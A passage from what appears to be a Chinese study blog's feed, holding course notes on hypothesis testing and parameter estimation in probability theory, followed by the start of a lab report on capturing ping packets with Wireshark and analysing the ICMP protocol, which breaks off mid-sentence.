两类错误及记号"></a>1.3.5 两类错误及记号</h3><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image_PFV4iYSzFK.png"></p><p>第I类错误的概率记为：$P_{ 当 H_{0} 为真拒绝H_{0}} $或$ P_{\mu \in H_{0}}\{拒绝H_{0}\}$</p><p>第II类错误的概率记为：$P_{ 当 H_{0} 不真接受H_{0}} $或$ P_{\mu \in H_{1}}\{接受H_{0}\}$</p><h3 id="1-3-6-显著性检验"><a href="#1-3-6-显著性检验" class="headerlink" title="1.3.6 显著性检验"></a>1.3.6 显著性检验</h3><p>只对犯第一类错误的概率加以控制，而不考虑犯第二类错误的概率的检验，称为显著性检验.</p><h3 id="1-3-7-双边备择假设与双边假设检验"><a href="#1-3-7-双边备择假设与双边假设检验" class="headerlink" title="1.3.7 双边备择假设与双边假设检验"></a>1.3.7 双边备择假设与双边假设检验</h3><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image_QZlc6kIoK4.png"></p><h3 id="1-3-8-右边检验与左边检验"><a href="#1-3-8-右边检验与左边检验" class="headerlink" title="1.3.8 右边检验与左边检验"></a>1.3.8 右边检验与左边检验</h3><ul><li>右边检验：形如$H_{0}: \mu \leq \mu_{0}$，$H_{1}: \mu&gt;\mu_{0}$的假设检验</li><li>左边检验：形如$H_{0}: \mu \geq \mu_{0}$，$H_{1}: \mu &lt; \mu_{0}$的假设检验</li></ul><p>右边检验与左边检验统称为<strong>单边检验</strong>。</p><h3 id="1-3-9-单边检验的拒绝域"><a href="#1-3-9-单边检验的拒绝域" class="headerlink" title="1.3.9 单边检验的拒绝域"></a>1.3.9 单边检验的拒绝域</h3><p>右边检验的拒绝域为：</p><p>$$z&#x3D;\frac{\overline{x}-\mu_0}{\sigma&#x2F;\sqrt{n}}\geq z_\alpha $$</p><p>左边检验的拒绝域为：</p><p>$$z&#x3D;\frac{\overline{x}-\mu_0}{\sigma&#x2F;\sqrt{n}} \leq - z_\alpha $$</p><h2 id="1-4-假设检验的一般步骤"><a href="#1-4-假设检验的一般步骤" class="headerlink" title="1.4 假设检验的一般步骤"></a>1.4 假设检验的一般步骤</h2><ol><li>根据实际问题的要求，提出原假设$H_0$及备择假设$H_1$</li><li>选择待检参数的估计量，确定检验统计量以及拒绝域的形式</li><li>求出拒绝域</li><li>根据样本观察值确定接受还是拒绝原假设</li></ol><hr><h1 id="2-正态总体均值的假设检验（单个总体）"><a href="#2-正态总体均值的假设检验（单个总体）" class="headerlink" title="2 正态总体均值的假设检验（单个总体）"></a>2 正态总体均值的假设检验（单个总体）</h1><h2 id="2-1-sigma-2-已知，关于-mu-的检验（Z检验）"><a href="#2-1-sigma-2-已知，关于-mu-的检验（Z检验）" class="headerlink" title="2.1 $\sigma^2$已知，关于$\mu$的检验（Z检验）"></a>2.1 $\sigma^2$已知，关于$\mu$的检验（Z检验）</h2><ol><li>假设检验$H_{0}: \mu&#x3D;\mu_{0}$，$H_{1}: \mu \neq \mu_{0}$</li><li>假设检验$H_{0}: \mu \leq \mu_{0}$，$H_{1}: \mu &gt; \mu_{0}$</li><li>假设检验$H_{0}: \mu \geq \mu_{0}$，$H_{1}: \mu &lt; \mu_{0}$</li></ol><p>利用$H_0$为真时服从$N(0, 1)$分布的统计量：</p><p>$$<br>Z&#x3D;\frac{\bar{X}-\mu_{0}}{\sigma &#x2F; \sqrt{n}} \sim N(0,1)<br>$$</p><p>来确定拒绝域，这种检验法称为<strong>Z 检验法</strong>。</p><blockquote><p>例1：某切割机在正常工作时, 切割每段金属棒的平均长度为10.5cm, 标准差是0.15cm, 今从一批产品中随机的抽取15段进行测量, 其结果如下：</p></blockquote><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image_sYx-ralNYR.png"></p><p>假定切割的长度服从正态分布，且标准差没有变化，试问该机工作是否正常？（α&#x3D;0.05）</p><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image__tyqHmn4PC.png"></p><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image_H0NKWhvIIZ.png"></p><h2 id="2-2-sigma-2-未知，关于-mu-的检验（t检验）"><a href="#2-2-sigma-2-未知，关于-mu-的检验（t检验）" class="headerlink" title="2.2 $\sigma^2$未知，关于$\mu$的检验（t检验）"></a>2.2 $\sigma^2$未知，关于$\mu$的检验（t检验）</h2><p>当$H_0$为真时，$\frac{\bar{X}-\mu_{0}}{S &#x2F; \sqrt{n}} \sim t(n-1)$，采用$t&#x3D;\frac{\bar{X}-\mu_{0}}{S &#x2F; \sqrt{n}}$来作为检验统计量的称为<strong>t检验</strong>。</p><p>取$k&#x3D;t_{\alpha &#x2F; 2}(n-1)$，则</p><p>$$<br>\boldsymbol{P}{|\frac{\bar{X}-\mu_{0}}{\boldsymbol{S} &#x2F; \sqrt{n}}| \geq \boldsymbol{t}_{a &#x2F; 2}(\boldsymbol{n}-1)}&#x3D;\alpha<br>$$</p><p>拒绝域为</p><p>$$<br>|t|&#x3D;\left|\frac{\bar{x}-\mu_{0}}{s &#x2F; \sqrt{n}}\right| \geq t_{\alpha &#x2F; 2}(n-1)<br>$$</p><hr><h1 id="3-正态总体方差的假设检验（单个总体）"><a href="#3-正态总体方差的假设检验（单个总体）" class="headerlink" title="3 正态总体方差的假设检验（单个总体）"></a>3 正态总体方差的假设检验（单个总体）</h1><p>设总体$X \sim N\left(\mu, \sigma^{2}\right)$，$\mu$和$\sigma^2$均未知，$X_{1}, X_{2}, \cdots, X_{n}$是来自X的样本，给定显著性水平α，要求检验假设</p><p>$$<br>H_{0}: \sigma^{2}&#x3D;\sigma_{0}^{2}, \quad H_{1}: \sigma^{2} \neq \sigma_{0}^{2}<br>$$</p><p>其中，$\sigma_{0}^{2}$为已知常数。</p><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image_V-WYOrQ6VA.png"></p><p><img src="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/image_RN7RpuPD7T.png"></p><hr><h1 id="4-本章总结"><a href="#4-本章总结" class="headerlink" title="4 本章总结"></a>4 本章总结</h1><ol><li>假设检验的基本原理、相关概念(9个)和一般步骤(5 步)。</li><li>熟练进行单个正态总体的均值检验（包括方差已知（Z检验）和未知（t检验）两种情况。）</li><li>熟练进行单个正态总体的方差检验。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第7章：参数估计</title>
      <link href="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/"/>
      <url>/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-参数估计"><a href="#1-参数估计" class="headerlink" title="1 参数估计"></a>1 参数估计</h1><p>设有一个统计总体,  总体的分布函数为$F(x, \theta)$，其中$\theta$为未知参数。$X_{1}, X_{2}, \cdots, X_{n}$是从总体X得到的样本，要根据该样本对参数$\theta$做出估计，或估计$\theta$的某个已知函数$g(\theta)$，这类问题成为<strong>参数估计</strong>。</p><p>已知总体的分布，来估计总体的参数。本章主要讲解参数估计中的<strong>点估计</strong>和<strong>区间估计</strong>。</p><hr><h1 id="2-点估计"><a href="#2-点估计" class="headerlink" title="2 点估计"></a>2 点估计</h1><h2 id="2-1-点估计的概念"><a href="#2-1-点估计的概念" class="headerlink" title="2.1 点估计的概念"></a>2.1 点估计的概念</h2><p>设总体X的分布函数$F(x ; \theta)$的形式已知，$\theta$是待估参数，$X_{1}, X_{2}, \cdots, X_{n}$是X的一个样本，$x_{1}, x_{2}, \cdots, x_{n}$是相应的样本值，用样本值估计参数值。</p><p>定义：构造一个适当的估计量$\hat{\theta}\left(X_{1}, X_{2}, \cdots, X_{n}\right)$，用它的观察值$\hat{\theta}\left(x_{1}, x_{2}, \cdots, x_{n}\right)$来估计未知参数$\theta$，称$\hat{\theta}\left(x_{1}, x_{2}, \cdots, x_{n}\right)$为$\theta$的估计量。这样的估计称为<strong>点估计</strong>。</p><p>寻求估计量的常用方法：</p><ol><li>矩估计法</li><li>最大似然法</li><li>最小二乘法</li><li>贝叶斯方法</li></ol><h2 id="2-2-矩估计法"><a href="#2-2-矩估计法" class="headerlink" title="2.2 矩估计法"></a>2.2 矩估计法</h2><h3 id="2-2-1-定义"><a href="#2-2-1-定义" class="headerlink" title="2.2.1 定义"></a>2.2.1 定义</h3><p>矩估计法是英国统计学家K.皮尔逊最早提出的。该法以大数定律为理论依据，用样本矩估计总体矩。</p><p>定义：若 X为<strong>连续型随机变量</strong>其概率密度为</p><p>$$<br>f\left(x ; \theta_{1}, \theta_{2}, \cdots, \theta_{k}\right)<br>$$</p><p>若X为<strong>离散型随机变量</strong>，其分布律为</p><p>$$<br>P{X&#x3D;x}&#x3D;p\left(x ; \theta_{1}, \theta_{2}, \cdots, \theta_{k}\right)<br>$$</p><p>其中$\theta_{1}, \theta_{2}, \cdots, \theta_{k}$为待估参数，$X_{1}, X_{2}, \cdots, X_{n}$是来自总体X的样本。</p><p>假设总体X的前k阶矩存在，即</p><p>$$<br>\mu_{l}&#x3D;E\left(X^{l}\right)&#x3D;\int_{-\infty}^{+\infty} x^{l} f\left(x ; \theta_{1}, \theta_{2}, \cdots, \theta_{k}\right) d x \quad X 连续型<br>$$</p><p>$$<br>\mu_{l}&#x3D;E\left(X^{l}\right)&#x3D;\sum x^{l} p\left(x ; \theta_{1}, \theta_{2}, \cdots, \theta_{k}\right) \quad X 离散型<br>$$</p><p>用样本原点矩估计相应的总体原点矩，又用样本原点矩的连续函数估计相应的总体原点矩的连续函数，这种参数点估计法称为<strong>矩估计法。</strong></p><h3 id="2-2-2-估计步骤"><a href="#2-2-2-估计步骤" class="headerlink" title="2.2.2 估计步骤"></a>2.2.2 估计步骤</h3><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_A6RA3U0a4J.png"></p><p>那么用各$\mu_{i}$的估计量$A_{i}$分别代替上式中的诸$\mu_{i}$，即可得到诸${\theta}_{j}$的矩估计量：</p><p>$$<br>\hat{\theta}_j&#x3D;\theta_j(A_1,A_2,\cdots,A_k)\quad j&#x3D;1,2,\cdots,k<br>$$</p><p>矩估计量的观察值称为<strong>矩估计值</strong>。</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_K_1wLth-FO.png"></p><blockquote><p>例1：设某炸药厂一天中发生着火现象的次数X，服从参数为$\lambda$的泊松分布，其中$\lambda$位置，用以下样本值，估计参数$\lambda<br>$。</p></blockquote><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_10dwsHtJ-U.png"></p><p>解：由于$X \sim \pi(\lambda), \quad \mu_{1}&#x3D;E(X) \Longrightarrow A_{1}&#x3D;\hat{\lambda}$，则$\lambda$的估计值如下：</p><p>$$<br>\hat{\lambda}&#x3D;\bar{x}&#x3D;\frac{1}{250}(0 \times 75+1 \times 90+\cdots+6 \times 1)&#x3D;1.22<br>$$</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_vWgkn6tId-.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_NzXvebo3kB.png"></p><h2 id="2-3-最大似然估计法"><a href="#2-3-最大似然估计法" class="headerlink" title="2.3 最大似然估计法"></a>2.3 最大似然估计法</h2><p>它是在总体类型已知条件下使用的一种参数估计方法，它首先是由德国数学家高斯在1821年提出的，最大似然估计法，是建立在最大似然原理的基础上的求点估计量的方法。</p><h3 id="2-3-1-最大似然估计原理"><a href="#2-3-1-最大似然估计原理" class="headerlink" title="2.3.1 最大似然估计原理"></a>2.3.1 最大似然估计原理</h3><p>若X为连续型随机变量，密度函数为$f(x ; \theta), \theta \in \Theta$，当给定样本$X_{1}, X_{2}, \ldots, X_{n}$时，定义似然函数为：</p><p>$$<br>L(\theta)&#x3D;L\left(x_{1}, x_{2}, \ldots, x_{n} ; \theta\right)&#x3D;\prod_{i&#x3D;1}^{n} f\left(x_{i} ; \theta \right)<br>$$</p><p>若$L(\hat{\theta})&#x3D;\max _{\theta} L(\theta)$，则有以下：</p><ul><li>$\hat{\theta}\left(x_{1}, x_{2}, \ldots, x_{n}\right) 称为 \theta 的最大似然估计值$</li><li>$\hat{\theta}\left(X_{1}, \ldots, X_{n}\right) 称为 \theta 的最大似然估计量$</li></ul><p>最大似然原理的直观想法是：在试验中概率最大的事件最有可能出现。</p><h3 id="2-3-2-最大似然估计量的一般步骤"><a href="#2-3-2-最大似然估计量的一般步骤" class="headerlink" title="2.3.2 最大似然估计量的一般步骤"></a>2.3.2 最大似然估计量的一般步骤</h3><p>（1）定义似然函数$<br>L(\theta)$</p><p>（2）一般地，求出$\ln L(\theta)$及似然方程</p><p>$$<br>\left.\frac{\partial \ln L(\theta)}{\partial \theta_{i}}\right|_{\theta&#x3D;\hat{\theta}}&#x3D;0 \quad(i&#x3D;{1 , 2}, \ldots, m)<br>$$</p><p>（3）解似然方程得到最大似然估计值</p><p>$$<br>\hat{\theta}_i&#x3D;\hat{\theta}_i\left(x_1,x_2,\ldots,x_n\right)\quad(i&#x3D;{1},{2},\ldots,m)<br>$$</p><p>（4）最后得到最大似然估计量</p><p>$$<br>\hat{\theta}_i&#x3D;\hat{\theta}_i\left(X_1,X_2,\ldots,X_n\right)\quad(i&#x3D;{1},{2},\ldots,m)<br>$$</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_LJiCNw3r7B.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_7npTXl0ymy.png"></p><h3 id="2-3-3-最大似然估计的不变性"><a href="#2-3-3-最大似然估计的不变性" class="headerlink" title="2.3.3 最大似然估计的不变性"></a>2.3.3 最大似然估计的不变性</h3><p>若$\theta$估计值为$\hat{\theta}$，则$u&#x3D;u(\theta)$估计值为$\hat{u}&#x3D;u(\hat{\theta})$，条件是$u&#x3D;u(\theta)$具有单值反函数$\theta&#x3D;\theta(u)$。</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_7lnJzKrlRd.png"></p><h2 id="2-4-本节总结"><a href="#2-4-本节总结" class="headerlink" title="2.4 本节总结"></a>2.4 本节总结</h2><ol><li><p>点估计的概念</p></li><li><p>矩估计法概念及步骤</p></li><li><p>最大似然估计法概念及步骤</p></li></ol><hr><h1 id="3-估计量的评选标准"><a href="#3-估计量的评选标准" class="headerlink" title="3 估计量的评选标准"></a>3 估计量的评选标准</h1><h2 id="3-1-无偏性"><a href="#3-1-无偏性" class="headerlink" title="3.1 无偏性"></a>3.1 无偏性</h2><p>若估计量$\hat{\theta}&#x3D;\theta\left(X_{1}, X_{2}, \cdots, X_{n}\right)$的数学期望$E(\hat{\theta})$对任意的$\theta \in \Theta$，都有$E(\hat{\theta})&#x3D;\theta$，则称$\hat{\theta}$是$\theta$的无偏估计。无偏性就是求期望。</p><p>例如：$E(\bar{X})&#x3D;\mu，E\left({S}^{\mathbf{2}}\right)&#x3D;{\sigma}^{\mathbf{2}}$。</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_GTjB8ENs8S.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_PBAXfDP4vK.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_6dWUKWfbe-.png"></p><h2 id="3-2-有效性"><a href="#3-2-有效性" class="headerlink" title="3.2 有效性"></a>3.2 有效性</h2><p>设$\hat{\boldsymbol{\theta}}_1&#x3D;\hat{\boldsymbol{\theta}}_1(\boldsymbol{X}_1,\cdots,\boldsymbol{X}_n)$和$\hat{\boldsymbol{\theta}}_2&#x3D;\hat{\boldsymbol{\theta}}_2(\boldsymbol{X}_1,\cdots,\boldsymbol{X}_n)$都是$\theta$的无偏估计量，若对任意$\theta \in \Theta$，有：</p><p>$$<br>D(\hat{\theta}_1) \leq D(\hat{\theta}_2)<br>$$</p><p>且至少对于某个$\theta \in \Theta$上式中的不等号成立，则称$\hat{\theta}_{1}$较$\hat{\theta}_2$有效。</p><ul><li>有效性就是求方差</li></ul><blockquote><p>续例3：试证当n&gt;1时，$\theta$的无偏估计量$\bar{X}$较nZ有效。</p></blockquote><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_ya2FQ3zEk9.png"></p><h2 id="3-3-相合性"><a href="#3-3-相合性" class="headerlink" title="3.3 相合性"></a>3.3 相合性</h2><p>前面讲的无偏性和有效性都是在样本容量n固定的前提下提出的。希望随着样本容量的增大，一个估计量的值稳定于待估参数的真值。这样，对估计量有以下相合性的要求。</p><p>若$\hat{\theta}&#x3D;\hat{\theta}\left(X_{1}, X_{2}, \cdots, X_{n}\right)$为参数$\theta$的估计量，若对于任意$\theta \in \Theta$，当$\boldsymbol{n} \rightarrow \infty$时，$\hat{\theta}&#x3D;\hat{\theta}\left(X_{1}, X_{2}, \cdots, X_{n}\right)$依概率收敛于$\theta$，则称$\hat{\theta}$为$\theta$的相合估计量。</p><p>即对任意的$\varepsilon$有</p><p>$$<br>\lim _{n \rightarrow \infty} P{|\hat{\theta}-\theta|&lt;\varepsilon}&#x3D;1<br>$$</p><hr><h1 id="4-区间估计"><a href="#4-区间估计" class="headerlink" title="4 区间估计"></a>4 区间估计</h1><h2 id="4-1-置信区间定义"><a href="#4-1-置信区间定义" class="headerlink" title="4.1 置信区间定义"></a>4.1 置信区间定义</h2><p>设$\theta$是一个待估参数，给定α&gt;0，若由样本$X_{1}, X_{2}, \ldots, X_{n}$确定的两个统计量$\underline{\theta}&#x3D;\underline{\theta}\left(X_{1}, X_{2}, \cdots, X_{n}\right)$和$\bar{\theta}&#x3D;\bar{\theta}\left(X_{1}, X_{2}, \cdots, X_{n}\right)$，其中$\underline{\theta}&lt;\bar{\theta}$，满足：</p><p>$$<br>P{\underline{\theta}&lt;\theta&lt;\bar{\theta}} \geq 1-\alpha<br>$$</p><p>则称区间$(\underline{\theta}, \bar{\theta})$是$\theta$的置信水平（置信度）为1-α的<strong>置信区间</strong>。其中，$\underline{\theta} 和 \bar{\theta} $分别称为置信下限和置信上限。</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_5uTGWgXWrY.png"></p><h2 id="4-2-置信区间的求法"><a href="#4-2-置信区间的求法" class="headerlink" title="4.2 置信区间的求法"></a>4.2 置信区间的求法</h2><p>（1）寻找参数$\theta$的一个良好的点估计$T\left(X_{1}, X_{2}, \ldots X_{n}\right)$</p><p>（2）寻找一个待估参数$\theta$和估计量T的函数$U(T, \theta)$，且其分布为已知</p><p>（3）对于给定的置信水平1-α，根据$U(T, \theta)$的分布，确定常熟a, b，使得</p><p>$$<br>\boldsymbol{P}(\boldsymbol{a}&lt;\boldsymbol{U}(T, \boldsymbol{\theta})&lt;\boldsymbol{b})&#x3D;1-\alpha<br>$$</p><p>解得$P{\underline{\theta}&lt;\theta&lt;\bar{\theta}}&#x3D;1-\alpha$。</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_etybgxKCXw.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_DMFrMMoFjK.png"></p><hr><h1 id="5-正态总体均值与方差的区间估计"><a href="#5-正态总体均值与方差的区间估计" class="headerlink" title="5 正态总体均值与方差的区间估计"></a>5 正态总体均值与方差的区间估计</h1><p>设已给定置信水平为1-α，并设$X_{1}, X_{2}, \ldots, X_{n}$为总体$N\left(\mu, \sigma^{2}\right)$的样本，$\bar{X}, S^{2}$分别是样本均值和样本方差。</p><h2 id="5-1-均值-mu-的置信区间"><a href="#5-1-均值-mu-的置信区间" class="headerlink" title="5.1 均值$\mu$的置信区间"></a>5.1 均值$\mu$的置信区间</h2><h3 id="5-1-1-方差-sigma-2-已知"><a href="#5-1-1-方差-sigma-2-已知" class="headerlink" title="5.1.1 方差$\sigma^{2}$已知"></a>5.1.1 方差$\sigma^{2}$已知</h3><p>$\mu$的置信水平为1-α的置信区间为$\left(\bar{X} \pm \frac{\sigma}{\sqrt{n}} z_{\alpha &#x2F; 2}\right)$</p><h3 id="5-1-2-方差-sigma-2-未知"><a href="#5-1-2-方差-sigma-2-未知" class="headerlink" title="5.1.2 方差$\sigma^{2}$未知"></a>5.1.2 方差$\sigma^{2}$未知</h3><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_BQXRR8wMW6.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_Jk5OwOwYNt.png"></p><h2 id="5-2-方差-sigma-2-的置信区间"><a href="#5-2-方差-sigma-2-的置信区间" class="headerlink" title="5.2 方差$\sigma^{2}$的置信区间"></a>5.2 方差$\sigma^{2}$的置信区间</h2><p>此处，根据实际问题的需要，只介绍$\mu$未知的情况。</p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_moBdTKhMyo.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_-FxnjGoKt3.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_dugoAhTQkP.png"></p><hr><h1 id="6-单侧置信区间"><a href="#6-单侧置信区间" class="headerlink" title="6 单侧置信区间"></a>6 单侧置信区间</h1><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_yv31QeUYY0.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_WH-qRrRUMw.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_-alPVerjbO.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_Z3BIZEiLmH.png"></p><p><img src="/2024/06/19/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/image_mcs7bRFMiQ.png"></p><hr><h1 id="7-本章总结"><a href="#7-本章总结" class="headerlink" title="7 本章总结"></a>7 本章总结</h1><ol><li>点估计：熟练使用矩估计法和最大似然估计法进行参数的点估计；</li><li>掌握估计量的评选标准：无偏性、有效性和相合性；</li><li>熟练进行正态总体参数的区间估计（包括单侧和双侧）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验2：数据包抓取与分析</title>
      <link href="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>Wireshark版本：4.2.5</li><li>Cmd版本：10.0.22631.3296</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><h2 id="2-1-Ping数据包抓取以及ICMP协议分析"><a href="#2-1-Ping数据包抓取以及ICMP协议分析" class="headerlink" title="2.1 Ping数据包抓取以及ICMP协议分析"></a>2.1 Ping数据包抓取以及ICMP协议分析</h2><p>Ping命令是一种网络工具，用于测试主机之间的连接性。通过发送ICMP回显请求消息到目标主机，并等待目标主机的回复，可以确定目标主机是否可达以及往返延迟（Round-Trip Time，RTT）是多少。Ping命令通常用于诊断网络连接问题，也可用于测量网络的稳定性和性能。</p><p>使用<code>Wireshark</code>工具抓取ping数据包，首先在<code>Cmd</code>状态下使用ping命令连接百度网址。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_PZGm-qE0gj.png"></p><p>图2.1  Ping命令结果</p><p>由图2.1可知，向<code>www.baidu.com</code>发送了4个数据包，总共收到了4个，没有丢失。之后在<code>Wireshark</code>中查看抓取的数据包。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_1_hfdkzWweWz.png"></p><p>图2.2  Ping命令抓包结果</p><p>由图2.2所示，通过过滤器查看ICMP协议的数据包，可以从数据包的Info字段看到有来自发送方的请求和来自接收方的回复。</p><p>ICMP（Internet Control Message 